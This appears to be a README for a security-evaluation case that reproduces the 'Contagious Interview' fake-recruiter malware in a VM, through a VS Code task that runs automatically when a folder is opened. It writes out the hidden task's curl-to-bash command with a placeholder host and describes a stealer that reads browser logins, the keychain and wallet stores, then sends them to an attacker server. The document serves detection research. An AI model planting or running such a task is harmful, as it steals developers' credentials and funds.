# Contagious Interview, by the editor

The same fake-recruiter campaign as
[`contagious-interview`](../contagious-interview), by the route it has used
since late 2025: the repository carries a `.vscode/tasks.json` whose one
task is set to run when the folder is opened, shows nothing, and pipes a
script from the attacker's server into the shell. The developer does not
build or run anything. They open the folder to read the code.

The recording is of a developer's Mac (a VM) where the person clones the
repository and opens it in VS Code, and of nothing else they do.

## What happens in the recording

| step | what the sensor sees | from the write-ups |
|---|---|---|
| 1 | `git clone` of the repository from the recruiter's host, which writes `.vscode/tasks.json`; `code shop-review` opens the folder | OpenSourceMalware, GitLab: a repository the person is asked to look over |
| 2 | the editor starts `/bin/zsh -l -c "curl 'https://<host>/settings/mac?flag=8' \| bash"` in a terminal no one sees | OpenSourceMalware, GitLab (the task, word for word but for the host) |
| 3 | that `bash` runs `curl -s -o ~/.vscode/env-bootstrap.sh …` and `nohup bash ~/.vscode/env-bootstrap.sh`, and ends; the terminal closes | OpenSourceMalware: the loader fetches a bootstrap script into `~/.vscode` and starts it with `nohup` (shown for Linux) |
| 4 | the bootstrap script fetches `package.json` and `env-setup.js` into `~/.vscode` with `curl`, runs `npm install`, then `node env-setup.js` | OpenSourceMalware |
| 5 | `node` connects to the server the script came from | OpenSourceMalware: it asks for the next stage, the stealer, and runs the answer |
| 6 | `node` reads the wallet extensions' stores, the browsers' `Login Data`, `~/Library/Keychains/login.keychain-db` and Firefox's key and login files, POSTs to the attacker's second server on port 1224, fetches `~/.nvc` with `curl` and starts `python3` on it; the Python backdoor follows | the stealer and backdoor, as in [`contagious-interview`](../contagious-interview), steps 2 to 9 |

`twin.sh` is the same kinds of acts by the person on their own work: a real
project cloned from GitHub, its dependencies installed, a tool installed by
its own script from `curl … | bash` (nvm), and the project opened in VS Code.

## What is real and what is stood in

Real: the editor and the shell it starts for the task, the task's command
line but for the host, every program and its parent (`zsh`, `curl`, `bash`,
`nohup`, `npm`, `node`, `python3`), the files written under `~/.vscode`, and
all of the stealer's and backdoor's steps as in the other case.

Stood in, beside what [`contagious-interview`](../contagious-interview)
lists (the recruiter's host, the attacker's server on 1224 and 1245, what is
sent, the files read, the names):

- **The setting.** The VM's VS Code has `task.allowAutomaticTasks` on
  (`vm/provision.sh`), and trusts `~/code`. That is how VS Code shipped when
  the campaign began: a trusted folder's tasks ran on opening. VS Code as it
  ships now (1.145, which the VM has) has the setting off and asks first, so
  on an untouched current install this task does not run until the person
  allows it. The recording is of an editor that runs it: an older VS Code,
  one of its forks, or a developer who turned the setting on for their own
  projects.
- **The trust question.** In the campaign the person is asked once whether
  they trust the folder's authors, and says yes. Here the folder is under
  `~/code`, which the developer already trusts, and no question is asked.
- **The task's host.** `vscode-config.acme-deploy.example` in the VM is
  [`standin/registry.py`](../../standin/registry.py) on the host, serving the
  files in [`stage/`](stage). In the campaign it is an app on Vercel.
- **The loader for a Mac.** The write-ups show the Linux loader (`wget`,
  `nohup bash`); [`stage/mac.sh`](stage/mac.sh) is the same with `curl`. It
  ignores the hang-up signal before starting the bootstrap script, without
  which the closing terminal ends it; the write-ups do not say how the real
  one manages.
- **The next stage.** The real `env-setup.js` runs what the server answers.
  Here the server answers nothing and the stealer's steps are in
  [`stage/env-setup.js`](stage/env-setup.js) itself. The `package.json` names
  `axios` as the real one does, so `npm install` fetches it; the script makes
  its request with node's own `https`.

Not in the recording: what the other case leaves out, and the Windows and
Linux branches of the task.

Every script of the payload runs only on a recording VM
(`/etc/tangent-eval-vm`; the JavaScript and Python also want
`cdn.shop-metrics.example` at a private address) and exits at once anywhere
else.

## Needs in the VM

VS Code with `~/code` trusted and `task.allowAutomaticTasks` on, which
`vm/provision.sh` gives. The case's sessions begin at the editor as well as
at Terminal: `entry` in `case.json`.

## Sources

See [`case.json`](case.json).
